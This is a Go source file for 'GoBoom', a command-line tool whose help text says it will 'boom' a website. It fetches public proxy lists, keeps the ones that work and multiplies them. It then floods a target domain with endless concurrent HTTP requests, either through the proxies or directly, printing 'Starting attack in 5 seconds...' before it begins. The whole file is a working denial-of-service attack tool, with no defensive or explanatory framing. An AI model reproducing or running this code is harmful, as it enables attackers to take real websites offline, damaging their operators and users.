package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/akamensky/argparse"
)

var statusCodeToEscape = []string{
	//"503 Too many open connections",
	"401 Unauthorized",
	"409 Conflict",
	"404 Not Found",
	"502 Bad Gateway",
	"504 Gateway Timeout",
	"407 Proxy Authentication Required",
	"400 Bad Request",
	"502 Proxy Error",
	"403 Forbidden",
	//"503 Service Unavailable",
	"504 DNS Name Not Found",
	"407 Unauthorized",
	"405 Method Not Allowed",
	//"503 Service Temporarily Unavailable",
}

func getProxyList_github(link string) []string {
	//format of the list is ip:port
	//return a list of proxy
	resp, err := http.Get(link)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

type Proxy_genode struct {
	Data []struct {
		ID                 string      `json:"_id"`
		IP                 string      `json:"ip"`
		AnonymityLevel     string      `json:"anonymityLevel"`
		Asn                string      `json:"asn"`
		City               string      `json:"city"`
		Country            string      `json:"country"`
		CreatedAt          time.Time   `json:"created_at"`
		Google             bool        `json:"google"`
		Isp                string      `json:"isp"`
		LastChecked        int         `json:"lastChecked"`
		Latency            float32     `json:"latency"`
		Org                string      `json:"org"`
		Port               string      `json:"port"`
		Protocols          []string    `json:"protocols"`
		Region             interface{} `json:"region"`
		ResponseTime       int         `json:"responseTime"`
		Speed              int         `json:"speed"`
		UpdatedAt          time.Time   `json:"updated_at"`
		WorkingPercent     interface{} `json:"workingPercent"`
		UpTime             float64     `json:"upTime"`
		UpTimeSuccessCount int         `json:"upTimeSuccessCount"`
		UpTimeTryCount     int         `json:"upTimeTryCount"`
	} `json:"data"`
	Total int `json:"total"`
	Page  int `json:"page"`
	Limit int `json:"limit"`
}

func getProxyList_genode() []string {
	// get the list of proxy at https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&filterUpTime=80&protocols=http%2Chttps&anonymityLevel=elite
	// return a list of proxy
	var proxy_list []string
	resp, err := http.Get("https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps&anonymityLevel=elite&anonymityLevel=anonymous")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	var proxy_genode Proxy_genode
	err = json.Unmarshal(body, &proxy_genode)
	if err != nil {
		log.Fatal(err)
	}
	for _, proxy := range proxy_genode.Data {
		proxy_list = append(proxy_list, proxy.IP+":"+proxy.Port)
	}
	return proxy_list
}

func getProxyList_file(path string) []string {
	//format of the list is ip:port
	//return a list of proxy
	file, err := os.Open(path)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(file)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

func stringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func handlerProxy(domain, proxy string) string {
	//just connect to the website and check the status code
	//use proxy to connect
	//format of proxy is ip:port
	//format of domain is domain.com
	mutex := &sync.Mutex{}
	mutex.Lock()
	proxyUrl, err := url.Parse("http://" + proxy)
	mutex.Unlock()
	if err != nil {
		return "error"
	}
	//create a new http client
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyUrl),
		}}
	//set http client like a mozilla browser
	//client timeout after 1 second
	client.Timeout = time.Millisecond * 1000
	//connect to the website
	mutex.Lock()
	resp, err := client.Get("http://" + domain)
	mutex.Unlock()
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()
	//if resp is 503 too many connection
	// make [][]string statusCodeToEscape
	if stringInSlice(resp.Status, statusCodeToEscape) {
		return "error"
	}
	if resp.StatusCode != 0 {
		//fmt.Println(resp.Status)
		return resp.Status
	} else {
		return "error"
	}
}

func handler(domain string) string {
	//just connect to the website and check the status code
	//format of domain is domain.com
	//create a new http client
	client := &http.Client{}
	//set http client like a mozilla browser
	client.Timeout = time.Millisecond * 100
	//connect to the website
	resp, err := client.Get("http://" + domain)
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()
	//if resp is 503 too many connection
	// make [][]string statusCodeToEscape
	if stringInSlice(resp.Status, statusCodeToEscape) {
		return "error"
	}
	if resp.StatusCode != 0 {
		//fmt.Println(resp.Status)
		return resp.Status
	} else {
		return "error"
	}
}

func removeDuplicates(elements []string) []string {
	// Use map to record duplicates as we find them.
	encountered := map[string]bool{}
	result := []string{}

	for v := range elements {
		if encountered[elements[v]] == true {
			// Do not add duplicate.
		} else {
			// Record this element as an encountered element.
			encountered[elements[v]] = true
			// Append to result slice.
			result = append(result, elements[v])
		}
	}
	// Return the new slice.
	return result
}

func add_good_proxy(proxy string, good_proxy []string) []string {
	var mutex = &sync.Mutex{}
	mutex.Lock()
	good_proxy = append(good_proxy, proxy)
	mutex.Unlock()
	return good_proxy
}

func check_host_up(domain string) bool {
	//check if the host is up
	_, err := net.LookupHost(domain)
	if err != nil {
		return false
	}
	return true
}

func test_proxy(proxy_file []string) []string {
	var good_proxy []string
	//get the list of proxy
	//proxy_list := getProxyList_genode()
	proxy_list := getProxyList_github("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt")
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt")...)
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")...)
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt")...)

	if len(proxy_file) > 0 {
		for _, file := range proxy_file {
			proxy_list = append(proxy_list, getProxyList_file(file)...)
		}
	}

	//remove duplicate
	proxy_list = removeDuplicates(proxy_list)
	fmt.Println("Total proxy : ", len(proxy_list))
	domain := "github.com"
	wg2 := sync.WaitGroup{}
	fmt.Println("Checking proxy...")
	for _, proxy := range proxy_list {
		wg2.Add(1)
		go func(proxy string) {
			defer wg2.Done()
			result := handlerProxy(domain, proxy)
			//if more than 5 seconde, the proxy is not good
			if result == "200 OK" || result == "200" {
				good_proxy = add_good_proxy(proxy, good_proxy)
			}
		}(proxy)
	}
	wg2.Wait()

	return good_proxy
}

func remove_proxy(proxy string, proxy_list []string) []string {
	var mutex = &sync.Mutex{}
	for i, p := range proxy_list {
		if p == proxy {
			mutex.Lock()
			proxy_list = append(proxy_list[:i], proxy_list[i+1:]...)
			mutex.Unlock()
			break
		}
	}
	return proxy_list
}

func main() {
	parser := argparse.NewParser("GoBoom", "Boom some website by proxy")
	domain := parser.String("d", "domain", &argparse.Options{Required: true, Help: "Domain to boom"})
	threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of core to use", Default: "max"})
	proxy_file := parser.StringList("p", "proxy-file", &argparse.Options{Required: false, Help: "Proxy file(s), separate with a ',' each files. Format of file(s) must be ip:port", Default: []string{}})
	proxy_mult := parser.Int("x", "proxy-mult", &argparse.Options{Required: false, Help: "You can multiply the working proxys detected with this option", Default: 12})
	mode := parser.Int("m", "mode", &argparse.Options{Required: false, Help: "Mode of attack, 1 for pass all traffic trough proxy, 2 don't use proxy", Default: 1})
	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		os.Exit(1)
	}
	if !check_host_up(*domain) {
		fmt.Println("The domain or ip is not up")
		os.Exit(1)
	}

	//set max GOMAXPROCS
	//detect the number of cpu
	cpu := runtime.NumCPU()

	//if threads superior to cpu convert to cpu
	if *threads == "max" {
		runtime.GOMAXPROCS(cpu)
	} else {
		threads_int, err := strconv.Atoi(*threads)
		if err != nil {
			fmt.Println("Error with threads")
			os.Exit(1)
		}
		if threads_int > cpu {
			runtime.GOMAXPROCS(cpu)
		} else {
			runtime.GOMAXPROCS(threads_int)
			cpu = threads_int
		}
	}
	//select mode 1 or 2
	if *mode == 1 {
		for _, p := range *proxy_file {
			//split all the files by comma
			if strings.Contains(p, ",") {
				*proxy_file = strings.Split(p, ",")
			} else {
				*proxy_file = append(*proxy_file, p)
			}
		}
		proxy_list := test_proxy(*proxy_file)
		var proxy_list_temp []string
		fmt.Println("Good proxy : ", len(proxy_list))
		for i := 0; i < *proxy_mult; i++ {
			proxy_list_temp = append(proxy_list_temp, proxy_list...)
			//if last
			if i == *proxy_mult-1 {
				proxy_list = proxy_list_temp
			}
		}

		//get the list of proxy
		fmt.Println("Total proxy after multiplication :", len(proxy_list))
		fmt.Println("Max process :", cpu)
		fmt.Println("Starting attack in 5 seconds...")
		time.Sleep(5 * time.Second)
		//start the threads
		//create a channel list of good proxy
		//mutex := &sync.Mutex{}
		var wg sync.WaitGroup
		// mutex := &sync.Mutex{}
		// var to_remove []string
		// var to_keep []string
		for {
			// if to_remove != nil {
			// 	for _, proxy := range to_remove {
			// 		proxy_list = remove_proxy(proxy, proxy_list)
			// 	}
			// // }
			// proxy_list = append(proxy_list, to_keep...)
			// to_remove = nil
			// to_keep = nil
			for _, proxy := range proxy_list {
				wg.Add(1)
				go func(proxy string) {
					status := handlerProxy(*domain, proxy)
					fmt.Println(status + " : " + proxy + "	time :	" + time.Now().Format("15:04:05.000"))
					//if status is error pop the proxy from the list
					// if status == "error" {
					// 	mutex.Lock()
					// 	to_remove = append(to_remove, proxy)
					// 	mutex.Unlock()
					// } else {
					// 	mutex.Lock()
					// 	to_keep = append(to_keep, proxy)
					// 	mutex.Unlock()
					// }
					wg.Done()
				}(proxy)
			}
			wg.Wait()
		}

	} else if *mode == 2 {
		//set max core to use to max
		cpu := runtime.NumCPU()
		runtime.GOMAXPROCS(cpu)
		threads_int, err := strconv.Atoi(*threads)
		if err != nil {
			fmt.Println("Error : threads must be a number")
			os.Exit(1)
		}
		for {
			var wg sync.WaitGroup
			for i := 0; i < threads_int; i++ {
				wg.Add(1)
				go func() {
					//use func handler
					status := handler(*domain)
					fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
					wg.Done()
				}()
			}
			wg.Wait()
			fmt.Println("All threads are dead, restarting")
		}
	}

}
